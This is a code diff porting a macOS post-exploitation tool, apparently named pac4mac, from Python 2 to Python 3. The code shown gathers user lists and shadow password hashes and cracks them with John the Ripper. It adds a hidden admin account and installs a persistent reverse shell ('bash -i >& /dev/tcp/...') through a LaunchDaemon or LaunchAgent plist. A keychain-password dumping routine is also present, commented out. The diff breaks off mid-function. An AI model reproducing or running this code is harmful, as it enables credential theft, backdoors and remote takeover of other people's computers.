@@ -1,4 +1,4 @@
-#! /usr/bin/python
+#! /usr/bin/python3
 # -*- coding: iso-8859-15 -*-
 
 
@@ -6,7 +6,7 @@ import sys, os
 import time
 import os.path
 import re
-import commands
+import subprocess
 import sqlite3 as lite
 import time,datetime
 import shutil
@@ -38,7 +38,7 @@ file_identity_dest = dir_results + '/#macosx_identity.txt'
 #file version osx
 file_version_dest = dir_results + '/#macosx_version.txt'
 
-#file log pac4mac 
+#file log pac4mac
 file_history_dest = dir_results + '/#log_pac4mac.txt'
 
 #directory for database
@@ -157,7 +157,7 @@ dir_dump_ios = dir_results + '/iOS_dump/'
 dir_passwords = dir_results + '/passwords_database'
 file_password_database = dir_passwords + '/ALL-passwords_1.txt'
 
-# browser files 
+# browser files
 file_log_browser = dir_results + '/browser_dump.txt'
 dir_browser_dump = dir_results + '/browser_dump/'
 
@@ -213,7 +213,7 @@ def print_red(text):
 
 def print_red_bold(text):
 	print ('\033[1;31m' + text + '\033[0;m')
-		
+
 def print_in(text):
 	print ('\033[0;34m' + text + '\033[1;m')
 
@@ -234,7 +234,7 @@ def fct_writefile(var_x, file_x):
 	file = open(file_x,'a')
 	file.write(var_x)
 	file.close()
-	
+
 def fct_writefile_del(var_x, file_x):
 	file_x = file_x.replace("\ "," ")
 	file = open(file_x,'w')
@@ -272,7 +272,7 @@ def fct_dump_main(db_search,dir_dest_dump,file_log):
 		file = open(db_search,'r')
 		lines_db = file.readlines()
 		file.close()
-			
+
 		filtre = re.compile('^\[(.+)\]\[(.+)\](.+)',re.IGNORECASE)
 		for i in range(len(lines_db)):
 			res = filtre.findall(lines_db[i])
@@ -303,7 +303,7 @@ def fct_dump_main(db_search,dir_dest_dump,file_log):
 					ret = fct_dump_plist(var_search,var_cmd,dir_dest_dump,file_log)
 
 
-				else : 
+				else :
 					print_red_bold("\nUnknown TAG : " + var_tag + " in " + db_search + "\n")
 
 	else:
@@ -314,24 +314,24 @@ def fct_dump_main(db_search,dir_dest_dump,file_log):
 										     #[dump system file]
 ###################################################################################################################################
 def fct_dump_files_system(var_search,var_path_file,path_dest_dump,file_log_dump):
-	
+
 	#tag = "COPY_FILE"
 
 	file_available = "0"
-	
+
 	#concatenation of path, username
 	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
 	res = filtre.findall(var_path_file)
 	for j in res:
 		var_file = j[1]
 		var_file_db =  j[0] + "/" + var_file
-		
+
 		#dump from mounted volume or target mode
 		if var_privileges_dump == "target":
 			var_file_db = path_to_HD_target + var_file_db
-		
+
 		if os.path.isfile(var_file_db):
-			file_available = "1"		
+			file_available = "1"
 			print_green("========================================================================")
 			print_log("[" + var_search.upper() + "] Copy of > [" + var_file_db + "]")
 			if not os.path.isdir(path_dest_dump) :
@@ -355,14 +355,14 @@ def fct_dump_files_system(var_search,var_path_file,path_dest_dump,file_log_dump)
 										     #[dump system directory]
 ###################################################################################################################################
 def fct_dump_dir_system(var_search,var_path_dir,path_dest_dump,file_log_dump):
-	
+
 	#tag = "COPY_DIR"
 
 	file_available = "0"
 
 	if var_privileges_dump == "target":
 		var_path_dir = path_to_HD_target + var_path_dir
-				
+
 	if os.path.isdir(var_path_dir):
 		file_available = "1"
 		print_green("========================================================================")
@@ -378,14 +378,17 @@ def fct_dump_dir_system(var_search,var_path_dir,path_dest_dump,file_log_dump):
 			log_dump = "[" + var_search.upper() + "]\nCopy of directory : " + var_path_dir + " to " + var_dir_dest + "\n"
 			fct_writefile(log_dump, file_log_dump)
 			print_log("[\\" + var_search.upper() + "] Stored into " + var_dir_dest)
-		except shutil.Error, exc:
-			errors = exc.args[0]
-			for error in errors:
-				src, dst, msg = error
-				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
+		except IOError :
+			print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
 			file_available = "0"
+#		except shutil.Error.exc:
+#			errors = exc.args[0]
+#			for error in errors:
+#				src, dst, msg = error
+#				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
+#			file_available = "0"
 		print_green("========================================================================")
-							
+
 	return file_available
 
 
@@ -393,7 +396,7 @@ def fct_dump_dir_system(var_search,var_path_dir,path_dest_dump,file_log_dump):
 										     #[dump user directory]
 ###################################################################################################################################
 def fct_dump_dir_user(var_search,var_path_dir,path_dest_dump,file_log_dump):
-	
+
 	#tag = "COPY_DIR_USER"
 
 	file_available = "0"
@@ -413,7 +416,7 @@ def fct_dump_dir_user(var_search,var_path_dir,path_dest_dump,file_log_dump):
 		#dump from mounted volume or target mode
 		if var_privileges_dump == "target":
 			var_path_db = path_to_HD_target + var_path_db
-	
+
 		if os.path.isdir(var_path_db):
 			file_available = "1"
 			print_green("========================================================================")
@@ -428,15 +431,19 @@ def fct_dump_dir_user(var_search,var_path_dir,path_dest_dump,file_log_dump):
 				log_dump = "[" + var_search.upper() + "]\nCopy of directory : " + var_path_db + " to " + var_dir_dest + "\n"
 				fct_writefile(log_dump, file_log_dump)
 				print_log("[\\" + var_search.upper() + "] Stored into " + var_dir_dest)
-			except shutil.Error, exc:
-				errors = exc.args[0]
-				for error in errors:
-					src, dst, msg = error
-					print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
+			except IOError :
+				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
 				file_available = "0"
+	#		except:
+	#			continue
+	#			errors = Error.args[0]
+	#			for error in errors:
+	#				src, dst, msg = error
+	#				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
+	#			file_available = "0"
 			print_green("========================================================================")
 
-	
+
 	return file_available
 
 
@@ -446,17 +453,17 @@ def fct_dump_dir_user(var_search,var_path_dir,path_dest_dump,file_log_dump):
 def fct_dump_files_user(var_search,var_path_file,path_dest_dump,file_log_dump):
 
 	#tag = "COPY_FILE_USER"
-	
+
 	file_available = "0"
 
 	#extract username list
 	file = open(file_userslist,'r')
 	lines_username = file.readlines()
 	file.close()
-		
+
 	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
 	res = filtre.findall(var_path_file)
-	
+
 	#for each user
 	for k in range(len(lines_username)):
 		for j in res:
@@ -487,7 +494,7 @@ def fct_dump_files_user(var_search,var_path_file,path_dest_dump,file_log_dump):
 					print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
 					file_available = "0"
 				print_green("========================================================================")
-	
+
 	return file_available
 
 
@@ -497,7 +504,7 @@ def fct_dump_files_user(var_search,var_path_file,path_dest_dump,file_log_dump):
 def fct_dump_files_profil(var_search,var_path_file,path_dest_dump,file_log_dump):
 
 	#tag = "COPY_FILE_PROFILE"
-	
+
 	file_available = "0"
 
 	tmp_file_profil = path_dest_dump + '/.tmpfileprofil.txt'
@@ -510,7 +517,7 @@ def fct_dump_files_profil(var_search,var_path_file,path_dest_dump,file_log_dump)
 		var_file_db = j[0] + "/" + var_file
 
 		#dump from mounted volume or target mode
-		if var_privileges_dump == "target": 
+		if var_privileges_dump == "target":
 			var_file_db = path_to_HD_target + var_file_db
 
 		filtre_search_profil = re.compile('^(\/.+)\/<PROFILE>',re.IGNORECASE)
@@ -548,8 +555,8 @@ def fct_dump_files_profil(var_search,var_path_file,path_dest_dump,file_log_dump)
 							except IOError :
 								print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
 								file_available = "0"
-							print_green("========================================================================")	
-	
+							print_green("========================================================================")
+
 	return file_available
 
 
@@ -559,15 +566,15 @@ def fct_dump_files_profil(var_search,var_path_file,path_dest_dump,file_log_dump)
 def fct_dump_files_user_profil(var_search,var_path_file,path_dest_dump,file_log_dump):
 
 	#tag = "COPY_FILE_USER_PROFILE"
-	
+
 	file_available = "0"
 
 	tmp_file_profil = path_dest_dump + '/.tmpfileprofil.txt'
-		
+
 	#extract username list
 	file = open(file_userslist,'r')
 	lines_username = file.readlines()
-	file.close()	
+	file.close()
 
 	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
 	res = filtre.findall(var_path_file)
@@ -580,7 +587,7 @@ def fct_dump_files_user_profil(var_search,var_path_file,path_dest_dump,file_log_
 			var_file_db = j[0].replace("<USER>",lines_username[k]) + "/" + var_file
 
 			#dump from mounted volume or target mode
-			if var_privileges_dump == "target": 
+			if var_privileges_dump == "target":
 				var_file_db = path_to_HD_target + var_file_db
 
 			filtre_search_profil = re.compile('^(\/.+)\/<USERPROFILE>',re.IGNORECASE)
@@ -621,7 +628,7 @@ def fct_dump_files_user_profil(var_search,var_path_file,path_dest_dump,file_log_
 									file_available = "0"
 								print_green("========================================================================")
 
-	
+
 	return file_available
 
 
@@ -629,7 +636,7 @@ def fct_dump_files_user_profil(var_search,var_path_file,path_dest_dump,file_log_
 										     #[launch command]
 ###################################################################################################################################
 def fct_cmd(var_search,var_cmd,path_dest_dump,file_log_dump):
-	
+
 	#tag = CMD
 
 	path_cmd_result = path_dest_dump + "CMD_" + file_log_dump.replace(dir_results + "/","")
@@ -642,7 +649,7 @@ def fct_cmd(var_search,var_cmd,path_dest_dump,file_log_dump):
 	print_green("========================================================================")
 	print_log("[" + var_search.upper() + "] Launching of the following command > \n[" + var_cmd+ "]")
 	print_green("Launching of the command, be patient ...\n...\n...")
-	res_cmd = commands.getoutput(var_cmd).strip('\n')
+	res_cmd = os.popen(var_cmd).read().strip('\n')
 	res_cmd = "[" + var_search.upper() + "]\n" + "[" + var_cmd + "]\n[RES]\n" + res_cmd + "\n[\RES]\n\n"
 	log_copy = "[" + var_search.upper() + "] \nLaunched Command : " + var_cmd + " and results are into: " + path_cmd_result + "\n"
 
@@ -659,7 +666,7 @@ def fct_cmd(var_search,var_cmd,path_dest_dump,file_log_dump):
 										     #[launch command with username parameter]
 ###################################################################################################################################
 def fct_cmd_user(var_search,var_cmd,path_dest_dump,file_log_dump):
-	
+
 	#tag = CMD_USER
 
 	path_cmd_result = path_dest_dump + "CMD_" + file_log_dump.replace(dir_results + "/","")
@@ -667,7 +674,7 @@ def fct_cmd_user(var_search,var_cmd,path_dest_dump,file_log_dump):
 	#extract username list
 	file = open(file_userslist,'r')
 	lines_username = file.readlines()
-	file.close()	
+	file.close()
 
 
 	#for researches which depend of <USER>
@@ -685,7 +692,7 @@ def fct_cmd_user(var_search,var_cmd,path_dest_dump,file_log_dump):
 		print_green("========================================================================")
 		print_log("[" + var_search.upper() + "] Launching of the following command > \n[" + var_cmd_user+ "]")
 		print_green("Launching of the command, be patient ...\n...\n...")
-		res_cmd = commands.getoutput(var_cmd_user).strip('\n')
+		res_cmd = os.popen(var_cmd_user).read().strip('\n')
 		res_cmd = "[" + var_search.upper() + "]\n" + "[" + var_cmd_user + "]\n[RES]\n" + res_cmd + "\n[\RES]\n\n"
 		log_copy = "[" + var_search.upper() + "] \nLaunched Command : " + var_cmd_user + " and results are into: " + path_cmd_result + "\n"
 
@@ -702,27 +709,27 @@ def fct_cmd_user(var_search,var_cmd,path_dest_dump,file_log_dump):
 										     #[dump generic PLIST file]
 ###################################################################################################################################
 def fct_dump_plist(var_search,var_path_file,path_dest_dump,file_log_dump):
-	
+
 	#tag = "PLIST"
 
 	file_available = "0"
-	
+
 	#concatenation of path, username
 	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
 	res = filtre.findall(var_path_file)
 	for j in res:
 		var_file = j[1]
 		var_file_db =  j[0] + "/" + var_file
-		
+
 		#dump from mounted volume or target mode
 		if var_privileges_dump == "target":
 			var_file_db = path_to_HD_target + var_file_db
-		
+
 		if os.path.isfile(var_file_db):
 			file_available = "1"
 			#dump from mounted volume or target mode
 			var_file_db = var_file_db.replace(" ","\ ")
-			
+
 			print_green("========================================================================")
 			print_log("[" + var_search.upper() + "] Copy and conversion of > [" + var_file_db + "]")
 			if not os.path.isdir(path_dest_dump) :
@@ -731,7 +738,7 @@ def fct_dump_plist(var_search,var_path_file,path_dest_dump,file_log_dump):
 			var_file_dest = var_search + "_" + var_file.replace(" ","\ ")
 			path_final_dest = path_dest_dump + var_file_dest
 			try:
-				commands.getoutput("plutil -convert xml1 " + var_file_db + " -o " + path_final_dest)
+				os.popen("plutil -convert xml1 " + var_file_db + " -o " + path_final_dest)
 				log_dump = "[" + var_search.upper() + "]\nCopy of PLIST file : " + var_file_db + " to " + path_final_dest + "\n"
 				fct_writefile(log_dump, file_log_dump)
 				print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
@@ -749,17 +756,17 @@ def fct_dump_plist(var_search,var_path_file,path_dest_dump,file_log_dump):
 def fct_dump_plist_user(var_search,var_path_file,path_dest_dump,file_log_dump):
 
 	#tag = "PLIST_USER"
-	
+
 	file_available = "0"
 
 	#extract username list
 	file = open(file_userslist,'r')
 	lines_username = file.readlines()
 	file.close()
-		
+
 	filtre = re.compile('(.+)\/(.+)',re.IGNORECASE)
 	res = filtre.findall(var_path_file)
-	
+
 	#for each user
 	for k in range(len(lines_username)):
 		for j in res:
@@ -784,7 +791,7 @@ def fct_dump_plist_user(var_search,var_path_file,path_dest_dump,file_log_dump):
 				var_file_dest = var_search + "_" + lines_username[k] + "_" + var_file.replace(" ","\ ")
 				path_final_dest = path_dest_dump + var_file_dest
 				try:
-					commands.getoutput("plutil -convert xml1 " + var_file_db + " -o " + path_final_dest)
+					os.popen("plutil -convert xml1 " + var_file_db + " -o " + path_final_dest)
 					log_dump = "[" + var_search.upper() + "]\nCopy of PLIST file : " + var_file_db + " to " + path_final_dest + "\n"
 					fct_writefile(log_dump, file_log_dump)
 					print_log("[\\" + var_search.upper() + "] Stored into " + path_final_dest)
@@ -792,7 +799,7 @@ def fct_dump_plist_user(var_search,var_path_file,path_dest_dump,file_log_dump):
 					print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump this file :(")
 					file_available = "0"
 				print_green("========================================================================")
-	
+
 	return file_available
 
 
@@ -809,7 +816,7 @@ def fct_dump_by_target():
 
 	#create of directories
 	os.makedirs(dir_passwords)
-	
+
 	#dump users and groups
 	fct_dump_users()
 
@@ -900,13 +907,13 @@ def fct_dump_by_target():
 											#[dump live information]
 ####################################################################################################################################
 def fct_dump_live_change_dir():
-	
-	
+
+
 	#dir_results has been modified :(
 	db_search_sys = dir_db + 'system_live.db'
 	file_log_sys = dir_results + '/system_live_dump.txt'
 	dir_dump_sys = dir_results + '/system_live_dump/'
-	
+
 	dir_users_info = dir_results + '/#users_info'
 	file_userslist = dir_users_info + '/users_list.txt'
 
@@ -927,16 +934,17 @@ def fct_identity():
 	for i in range(len(lines_db)):
 		file_identity = lines_db[i].strip("\n")
 		if "<USER>" in file_identity:
-			file_identity = file_identity.replace("<USER>",var_home)
+			#file_identity = file_identity.replace("<USER>",var_home)
+			lines_id = file_identity.replace("<USER>",var_home)
 		if os.path.isfile(file_identity):
 			print_red_bold("\n[] Dump MAC identity")
 			print_green("========================================================================")
 			print_log("[IDENTITY] About this MAC  > ")
-			
-			file_identity = file_identity.replace(" ","\ ")
-			file = open(file_identity,'r')
-			lines_id = file.readlines()
-			file.close()
+
+			#file_identity = file_identity.replace(" ","\ ")
+			#file = open(file_identity,'r')
+			#lines_id = file.readlines()
+			#file.close()
 
 			tag_registration = "0"
 			for index_lines_id in range(len(lines_id)):
@@ -948,7 +956,7 @@ def fct_identity():
 						print_green(data_identity)
 						fct_writefile(data_identity + "\n",file_identity_dest)
 						fct_add_pass_database(data_identity + "\n")
-					
+
 			print_log("[\\IDENTITY] Stored into " + file_identity_dest)
 			print_green("========================================================================")
 
@@ -961,7 +969,7 @@ def fct_dump_users():
 	if not os.path.isdir(dir_users_info):
 		os.makedirs(dir_users_info)
 
-	print_red_bold("\n[] Dump Usernames")	
+	print_red_bold("\n[] Dump Usernames")
 	# users
 	if var_privileges_dump == "target":
 		var_userslist = ""
@@ -969,16 +977,16 @@ def fct_dump_users():
 			if file not in "Shared" and file not in ".localized" and file not in ".DS_Store":
 				var_userslist = var_userslist + file + "\n"
 	else:
-		var_userslist=os.popen("/usr/bin/dscacheutil -q user|egrep -B 5 'bash|zsh'|grep name|cut -c '7-'").read().strip("\n")
-	
+		var_userslist=os.popen("/usr/bin/dscacheutil -q user|egrep -B 5 'bash|zsh'|grep name|cut -c '7-'|egrep -v '_'").read().strip("\n")
+
 	print_green("========================================================================")
 	print_log("[USERS] The available users are the following > ")
 	print_green(var_userslist)
-	print_log("\n[\USERS] Stored into " + file_userslist)
+	print_log("[USERS] Stored into " + file_userslist)
 	print_green("========================================================================")
 	fct_writefile(var_userslist,file_userslist)
 	fct_add_pass_database(var_userslist + "\n")
-	
+
 	#users admin
 	if var_privileges_dump == "target" :
 		file = open(db_search_admin,'r')
@@ -989,22 +997,22 @@ def fct_dump_users():
 			print_green("========================================================================")
 			print_log("[USERS_ADMIN] The available users of Admin group are the followings > ")
 			print_green(var_usersadmin)
-			print_log("\n[\USERS_ADMIN] Stored into " + file_usersadmin)
+			print_log("[USERS_ADMIN] Stored into " + file_usersadmin)
 			print_green("========================================================================")
 			fct_writefile(var_usersadmin,file_usersadmin)
 
-	else : 
+	else :
 		var_usersadmin=os.popen("/usr/bin/dscl . -read /Groups/admin | grep 'GroupMembership:' | cut -c '18-' | sed '/root / s///'").read().strip("\n")
 		print_green("========================================================================")
 		print_log("[USERS_ADMIN] The available users of Admin group are the followings > ")
 		print_green(var_usersadmin)
-		print_log("\n[\USERS_ADMIN] Stored into " + file_usersadmin)
+		print_log("[USERS_ADMIN] Stored into " + file_usersadmin )
 		print_green("========================================================================")
 		fct_writefile(var_usersadmin,file_usersadmin)
 
 
 def fct_dump_users_hashes() :
-	
+
 	#hashes dump
 	if var_version == "10" :
 		file=open(file_userslist,'r')
@@ -1013,16 +1021,16 @@ def fct_dump_users_hashes() :
 		var_allusershashes = ""
 		for i in range(len(lines_file)):
 			var_usershashes = os.popen("cat /var/db/shadow/hash/$(dscl localhost -read /Search/Users/" + lines_file[i].strip("\n") + " | grep GeneratedUID | cut -c15-) | cut -c169-216").read().strip("\n")
-			var_usershashes = lines_file[i].strip("\n") +":" + var_usershashes	
+			var_usershashes = lines_file[i].strip("\n") +":" + var_usershashes
 		var_allusershashes = var_allusershashes + var_usershashes + "\n"
-		
+
 		print_green("========================================================================")
 		print_log("[USERS_HASHES] The available users hashes are the following > ")
 		print_green(var_allusershashes)
-		print_log("[\USERS_HASHES] Stored into " + file_allusershashes)
+		print_log("[USERS_HASHES] Stored into " + file_allusershashes)
 		print_green("========================================================================")
 		fct_writefile(var_allusershashes,file_allusershashes)
-	
+
 	elif var_version == "11" :
 		file=open(file_userslist,'r')
 		lines_file = file.readlines()
@@ -1038,15 +1046,15 @@ def fct_dump_users_hashes() :
 
 			#common
 			var_allusershashes = var_allusershashes + var_usershashes + "\n"
-		
+
 		print_green("========================================================================")
 		print_log("[USERS_HASHES] The available users hashes are the following > ")
 		print_green(var_allusershashes)
-		print_log("[\USERS_HASHES] Stored into " + file_allusershashes)
+		print_log("[USERS_HASHES] Stored into " + file_allusershashes)
 		print_green("========================================================================")
 		fct_writefile(var_allusershashes,file_allusershashes)
-	
-	else: 
+
+	else:
 		#print_log("https://gist.github.com/3258894")
 		#print_log("http://www.artiflo.net/2009/08/pbkdf2-et-generation-des-cles-de-chiffrement-de-disque/")
 		file=open(file_userslist,'r')
@@ -1058,18 +1066,18 @@ def fct_dump_users_hashes() :
 			var_usershashes = lines_file[i].strip("\n") + ":" + var_usershashes
 			#common
 			var_allusershashes = var_allusershashes + var_usershashes + "\n"
-		
+
 		print_green("========================================================================")
 		print_log("[USERS_HASHES] The available users hashes are the following > ")
 		print_green(var_allusershashes)
-		print_log("[\USERS_HASHES] Stored into " + file_allusershashes)
+		print_log("[USERS_HASHES] Stored into " + file_allusershashes)
 		print_green("========================================================================")
-		fct_writefile(var_allusershashes,file_allusershashes)	
+		fct_writefile(var_allusershashes,file_allusershashes)
 
 
 
 	#crack dump
-	if mode == "LIAM" or var_privileges_dump == "singlemode": 
+	if mode == "LIAM" or var_privileges_dump == "singlemode":
 		print_green("========================================================================")
 		print_log("\n[USERS_PASSWORD] Be patient, attempt to crack the passwords with found passwords ... (ctrl+c to cancel)")
 		os.system(dir_path_jtr + "/john " + file_allusershashes +  " --wordlist=" + file_password_database)
@@ -1102,10 +1110,10 @@ def fct_dump_users_hashes() :
 		var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
 		print_green(var_crackedhashes)
 		fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
-		
-		print_log("[\USERS_PASSWORD] Stored into " + file_crackedhashes)
+
+		print_log("[USERS_PASSWORD] Stored into " + file_crackedhashes)
 		print_green("========================================================================")
-		
+
 		var_all_passwords = os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort | uniq").read()
 		fct_add_pass_database(var_all_passwords)
 
@@ -1118,8 +1126,8 @@ def fct_dump_users_hashes() :
 def fct_add_user_root():
 	#init variables
 	print_red_bold("\n[] Add Root User")
-	
-	user_add = raw_input("Do you want to add user ? y/[n] > ")
+
+	user_add = input("Do you want to add user ? y/[n] > ")
 	if user_add == "y" :
 		#add user with root privileges
 		uid_max = os.popen("dscl . -list /Users UniqueID | awk '{print $2}' | sort -ug | tail -1").read()
@@ -1135,14 +1143,14 @@ def fct_add_user_root():
 		os.system("dscl . -passwd /Users/" + new_username + " " +  passofuser)
 		os.system("dseditgroup -o edit -t user -a " + new_username + " admin")
 		os.system("createhomedir -c > /dev/null")
-			
+
 		#Active Windows password prompt with field username/password
 		#os.system("defaults write /Library/Preferences/com.apple.loginwindow SHOWFULLNAME YES")
-			
+
 		print_green("========================================================================")
 		print_log("[USER_ADDED] You can connect you with user (root priv.) > ")
 		print_green(new_username + "/" + passofuser)
-		print_log("[\USER_ADDED] Stored into " + file_useradded)
+		print_log("[USER_ADDED] Stored into " + file_useradded)
 		print_green("========================================================================")
 		fct_writefile(new_username + "/" + passofuser,file_useradded)
 	else:
@@ -1161,17 +1169,17 @@ def fct_add_backdoor():
 
 	print_red_bold("\n[] Add Persistent Reverse shell")
 	print_green("========================================================================")
-	user_backdoor = raw_input("Do you want to add Persistent Reverse Shell toward your Home ? y/[n] > ")
+	user_backdoor = input("Do you want to add Persistent Reverse Shell toward your Home ? y/[n] > ")
 	if user_backdoor == "y" :
-		ip_remote = raw_input("[REV_SHELL]Please to input your Home IP > ")
-		port_remote = raw_input("[REV_SHELL]Please to input remote TCP port > ")
+		ip_remote = input("[REV_SHELL]Please to input your Home IP > ")
+		port_remote = input("[REV_SHELL]Please to input remote TCP port > ")
 		if var_privileges_dump == "rootaccess":
 			path_launch = "/Library/LaunchDaemons/"
 		else:
 			path_launch = "/Users/" + var_home + "/Library/LaunchAgents/"
 
 		path_backdoor = "/Users/" + var_home + "/.backdoor.sh"
-		
+
 		backdoor_content = "#!/bin/bash\n"
 		backdoor_content +=  "bash -i >& /dev/tcp/" + ip_remote + "/" + port_remote + " 0>&1\n"
 		backdoor_content += "wait"
@@ -1205,13 +1213,13 @@ def fct_add_backdoor():
 		content_launch += "\t<true/>\n"
 		content_launch += "\t<key>StartInterval</key>\n"
 		content_launch += "\t<integer>60</integer>\n"
-		content_launch += "\t<key>AbandonProcessGroup</key>\n" 
+		content_launch += "\t<key>AbandonProcessGroup</key>\n"
 		content_launch += "\t<true/>\n"
 		content_launch += "</dict>\n"
 		content_launch += "</plist>"
 
 		fct_writefile_del(content_launch,path_launch)
-		 
+
 		os.system("chmod 600 " + path_launch)
 
 		os.system("launchctl load " + path_launch)
@@ -1232,7 +1240,7 @@ def fct_dump_secrets_browser(type_search):
 		db_search = dir_db + 'browser_hist.db'
 	elif type_search == "downloads" :
 		db_search = dir_db + 'browser_download.db'
-	
+
 	fct_dump_main(db_search,dir_browser_dump,file_log_browser)
 
 ###################################################################################################################################
@@ -1246,107 +1254,107 @@ def fct_authentication_dump():
 ###################################################################################################################################
 										     #[dump of current keychain]
 ###################################################################################################################################
-def fct_dump_current_keychain():
-	
-	print_red_bold("\n[] Dump Current Keychain")
-	path_current_keychain = os.popen("security default-keychain").read()
-	filtre_search_keychain = re.compile('"(\/.+)"',re.IGNORECASE)
-	res_current_keychain = filtre_search_keychain.findall(path_current_keychain)
-	if not os.path.isdir(dir_dump_keychain):
-		os.makedirs(dir_dump_keychain)
-	for file_current_keychain in res_current_keychain:
-		shutil.copyfile(file_current_keychain,file_keychain_current)
+#def fct_dump_current_keychain():
 
-		#alternative to stop if you don't know current leychain password
-		raw_input("Press enter to extract data stored into current keychain ... \nWarning : Press Ctrl + C during dump process if current keychain is locked and you don't know password")
-		os.system("security dump-keychain  -d " + file_current_keychain + " > " + file_current_keychain_decrypted)
+#	print_red_bold("\n[] Dump Current Keychain")
+#	path_current_keychain = os.popen("security default-keychain").read()
+#	filtre_search_keychain = re.compile('"(\/.+)"',re.IGNORECASE)
+#	res_current_keychain = filtre_search_keychain.findall(path_current_keychain)
+#	if not os.path.isdir(dir_dump_keychain):
+#		os.makedirs(dir_dump_keychain)
+#	for file_current_keychain in res_current_keychain:
+#		shutil.copyfile(file_current_keychain,file_keychain_current)
+#
+#		#alternative to stop if you don't know current leychain password
+#		input("Press enter to extract data stored into current keychain ... \nWarning : Press Ctrl + C during dump process if current keychain is locked and you don't know password")
+#		os.system("security dump-keychain  -d " + file_current_keychain + " > " + file_current_keychain_decrypted)
+#
+#		print_log("[KEYCHAIN_CURRENT] Current keychain has been copied > ")
+#		print_green(file_current_keychain)
+#		print_log("[KEYCHAIN_CURRENT] Orignal Keychain is stored into " + file_keychain_current)
+#		print_log("[KEYCHAIN_CURRENT] Decrypted Keychain is stored into " + file_current_keychain_decrypted)
+#		log_dump = "[KEYCHAIN_CURRENT]\nCopy of encrypted file : " + path_current_keychain.strip("\n") + " to " + file_keychain_current + "\n"
+#		fct_writefile(log_dump, file_log_keychain)
+#		log_dump = "[KEYCHAIN_CURRENT]\nCopy of decrypted file : " + path_current_keychain.strip("\n") + " to " + file_current_keychain_decrypted + "\n"
+#		fct_writefile(log_dump, file_log_keychain)
 
-		print_log("[KEYCHAIN_CURRENT] Current keychain has been copied > ")
-		print_green(file_current_keychain)
-		print_log("[KEYCHAIN_CURRENT] Orignal Keychain is stored into " + file_keychain_current)
-		print_log("[KEYCHAIN_CURRENT] Decrypted Keychain is stored into " + file_current_keychain_decrypted)
-		log_dump = "[KEYCHAIN_CURRENT]\nCopy of encrypted file : " + path_current_keychain.strip("\n") + " to " + file_keychain_current + "\n"
-		fct_writefile(log_dump, file_log_keychain)
-		log_dump = "[KEYCHAIN_CURRENT]\nCopy of decrypted file : " + path_current_keychain.strip("\n") + " to " + file_current_keychain_decrypted + "\n"
-		fct_writefile(log_dump, file_log_keychain)
-		
 
 	#Display and record keychain passwords
-	file_keychain_decrypted=open(file_current_keychain_decrypted,'r')
-	lines_keychain=file_keychain_decrypted.readlines()
-	file_keychain_decrypted.close()
-	tag = "data:"
-	j = 0
-	for i in range(len(lines_keychain)) :
-		lines_keychain[i] = lines_keychain[i].strip("\n")
-		if j == 1 and len(lines_keychain[i]) <= size_pass_keychain and lines_keychain[i] != "" :
-			#print_green("Password: XXXXXXXXXXXXXXXXXXXX")
-			print_green("Password: " + lines_keychain[i].strip("\"")+"\n")
-			fct_writefile("Password: " + lines_keychain[i].strip("\"")+"\n", file_current_keychain_pass)
-			fct_add_pass_database(lines_keychain[i].strip("\"")+"\n")
-			j = 0
-		elif "data:" in lines_keychain[i]:
-			j = 1
-		else: 
-			j = 0
-			filtre=re.compile('0x00000007\ \<blob\>\=\"(.+)\"',re.IGNORECASE)
-			res=filtre.findall(lines_keychain[i])
-			for k in res:
-				print_green("\nTarget: " + k)
-				fct_writefile("\nTarget: " + k.strip("\"")+"\n", file_current_keychain_pass)
+#	file_keychain_decrypted=open(file_current_keychain_decrypted,'r')
+#	lines_keychain=file_keychain_decrypted.readlines()
+#	file_keychain_decrypted.close()
+#	tag = "data:"
+#	j = 0
+#	for i in range(len(lines_keychain)) :
+#		lines_keychain[i] = lines_keychain[i].strip("\n")
+#		if j == 1 and len(lines_keychain[i]) <= size_pass_keychain and lines_keychain[i] != "" :
+#			#print_green("Password: XXXXXXXXXXXXXXXXXXXX")
+#			print_green("Password: " + lines_keychain[i].strip("\"")+"\n")
+#			fct_writefile("Password: " + lines_keychain[i].strip("\"")+"\n", file_current_keychain_pass)
+#			fct_add_pass_database(lines_keychain[i].strip("\"")+"\n")
+#			j = 0
+#		elif "data:" in lines_keychain[i]:
+#			j = 1
+#		else:
+#			j = 0
+#			filtre=re.compile('0x00000007\ \<blob\>\=\"(.+)\"',re.IGNORECASE)
+#			res=filtre.findall(lines_keychain[i])
+#			for k in res:
+#				print_green("\nTarget: " + k)
+#				fct_writefile("\nTarget: " + k.strip("\"")+"\n", file_current_keychain_pass)
+#
+#			filtre = re.compile('\"acct\"\<blob\>\=\"(.+)\"',re.IGNORECASE)
+#			res = filtre.findall(lines_keychain[i])
+#			for k in res:
+#				print_green("Login: " + k)
+#				fct_writefile("Login: " + k.strip("\"")+"\n", file_current_keychain_pass)
+#
+#	print_log("[\KEYCHAIN_CURRENT] Decrypted passwords into Keychain are stored into " + file_current_keychain_pass)
 
-			filtre = re.compile('\"acct\"\<blob\>\=\"(.+)\"',re.IGNORECASE)
-			res = filtre.findall(lines_keychain[i])
-			for k in res:
-				print_green("Login: " + k)
-				fct_writefile("Login: " + k.strip("\"")+"\n", file_current_keychain_pass)
-
-	print_log("[\KEYCHAIN_CURRENT] Decrypted passwords into Keychain are stored into " + file_current_keychain_pass)
-	
 
 
 	#dump keychain password with master key in memory
-	if var_privileges_dump == "rootaccess":
-		("\n\n[KEYCHAIN_CURRENT_JUUSO] Attempting to identification keychain master key in memory (securityd process) ... ")
